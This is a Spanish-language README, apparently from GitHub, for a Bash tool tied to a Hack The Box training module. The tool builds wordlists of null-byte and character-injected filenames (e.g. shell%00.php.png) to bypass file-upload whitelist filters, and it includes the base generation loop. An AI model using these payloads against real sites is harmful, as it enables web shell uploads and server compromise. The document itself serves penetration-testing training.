# Character-Injection-2-extension

Simple script que permite generar diccionarios para la inyeccion de codigos (ej. %00) y lograr el bypass de file upload, el scrip generar diccionarios con la inyeccion de codigo en las 3 siguientes posisiones, al comienzo shell%00.php.png en medio shell.php%00.png y al final shell.php.png%00 lo que permitira mediante ataque de diccionario adivinar en donde es vulnerable y permitir la carga de archivos maliciosos. (https://academy.hackthebox.com/module/136/section/1289) CPTS - Filtros de lista blanca, basicamente es el siguiente script, "pero mejorado".

for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done

## New Script

## IMG 1

Ingresa el nombre de la carga util que desea y la extension permitida por la pagina donde cargaras el archivo (ej. shell y .jpg).

![Image](https://github.com/user-attachments/assets/6a20b497-4376-48d6-8098-01127ec288ba)

## IMG 2

Se crearan 4 diccionarios o wordlist.

![Image](https://github.com/user-attachments/assets/b6f50a57-28a5-4407-980e-22c6c51df185)

## IMG 3

Imagen de ejemplo de creacion.

![Image](https://github.com/user-attachments/assets/3f280d48-6031-4721-8eff-30b57e4b9fc1)

## IMG 4

![Image](https://github.com/user-attachments/assets/921d9268-321a-4ae2-bad3-b02beab2af4d)

## IMG 5

![Image](https://github.com/user-attachments/assets/5a91e1e9-38a5-4dc6-bcdf-1b8c3d587c0a)

## Uso

Solo descarga la herramienta.

Luego dale permisos con chmod +x

y ejecuta.
